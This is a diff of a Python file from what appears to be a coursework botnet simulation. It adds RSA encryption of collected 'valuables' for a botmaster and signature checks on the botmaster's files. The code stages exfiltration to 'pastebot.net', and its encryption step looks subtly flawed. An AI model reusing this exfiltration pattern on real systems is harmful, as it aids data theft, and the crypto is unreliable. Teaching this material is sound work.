@@ -2,6 +2,7 @@ import os
 import Crypto.PublicKey.RSA as RSA
 import Crypto.Hash.SHA256 as SHA256
 import Crypto.Signature.PKCS1_v1_5 as Signer
+import Crypto.Cipher.PKCS1_v1_5 as Cipher
 
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
@@ -9,14 +10,14 @@ filestore = {}
 # Valuable data to be sent to the botmaster
 valuables = []
 
-###
-
 def save_valuable(data):
     valuables.append(data)
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-    return data
+    pubkey = RSA.importKey(open('id_rsa.pub').read())
+    hash = SHA256.new(data)
+    return Cipher.new(pubkey).encrypt(data+hash.digest())
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
@@ -31,24 +32,17 @@ def upload_valuables_to_pastebot(fn):
 
     print("Saved valuables to pastebot.net/%s for the botnet master" % fn)
 
-###
-
 def verify_file(f):
-    # Verify the file was sent by the bot master
-    # TODO: For Part 2, you'll use public key crypto here
-    # Naive verification by ensuring the first line has the "passkey"
     pubkey = RSA.importKey(open('id_rsa.pub','r').read())
     hash = SHA256.new(f[256:])
     signer = Signer.new(pubkey)
-    
-    
-    # lines = f.split(bytes("\n", "ascii"), 1)
-    # first_line = lines[0]
-    # RSA Verification, Deprecated
-    # return pubkey.verify(lines[1],(int(first_line),""))
-
     return signer.verify(hash, f[:256])
 
+    # RSA Verification, Deprecated
+    # lines = f.split(bytes("\n", "ascii"), 1)
+    # first_line = lines[0]
+    # return pubkey.verify(lines[1],(int(first_line),""))
+    
 def process_file(fn, f):
     if verify_file(f):
         # If it was, store it unmodified
